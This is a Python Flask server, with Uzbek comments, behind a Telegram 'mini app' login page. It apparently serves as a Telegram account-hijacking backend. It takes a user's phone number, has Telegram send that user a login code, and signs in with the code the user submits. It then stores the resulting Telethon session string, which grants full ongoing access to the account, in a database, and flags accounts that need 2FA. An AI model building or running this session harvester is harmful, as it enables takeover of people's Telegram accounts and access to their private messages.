import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError
)
from database import get_db, init_db

# =====================
# CONFIG (ENV DAN!)
# =====================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# =====================
# INIT
# =====================
app = Flask(__name__, template_folder="templates")
init_db()

# =====================
# ASYNC HELPER
# =====================
def run_async(coro):
    return asyncio.get_event_loop().run_until_complete(coro)

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# =====================
# SEND CODE
# =====================
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    if not phone:
        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"})

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result.phone_code_hash

    try:
        phone_code_hash = asyncio.run(_send())

        # 🔐 HASH NI DB GA YOZAMIZ
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO login_codes (phone, phone_code_hash)
            VALUES (%s, %s)
            ON CONFLICT (phone)
            DO UPDATE SET phone_code_hash = EXCLUDED.phone_code_hash
        """, (phone, phone_code_hash))
        conn.commit()
        conn.close()

        return jsonify({"status": "ok"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if not phone or not code:
        return jsonify({"status": "error", "message": "Ma’lumot yetarli emas"})

    # 🔍 HASH NI DB DAN OLAMIZ
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        "SELECT phone_code_hash FROM login_codes WHERE phone = %s",
        (phone,)
    )
    row = cur.fetchone()
    conn.close()

    if not row:
        return jsonify({
            "status": "error",
            "message": "Kod topilmadi. Qayta yuboring."
        })

    phone_code_hash = row[0]

    async def _verify():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user = await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )

        # ✅ STRING SESSION OLAMIZ
        session_string = client.session.save()
        await client.disconnect()
        return user.id, session_string

    try:
        user_id, session_string = asyncio.run(_verify())

        # 💾 SESSION NI DB GA YOZAMIZ
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO user_sessions (user_id, session_string)
            VALUES (%s, %s)
            ON CONFLICT (user_id)
            DO UPDATE SET session_string = EXCLUDED.session_string
        """, (user_id, session_string))

        # 🔥 KODNI O‘CHIRAMIZ
        cur.execute(
            "DELETE FROM login_codes WHERE phone = %s",
            (phone,)
        )

        conn.commit()
        conn.close()

        return jsonify({"status": "ok"})

    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})

    except PhoneCodeInvalidError:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": "Server xatosi"
        })

# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
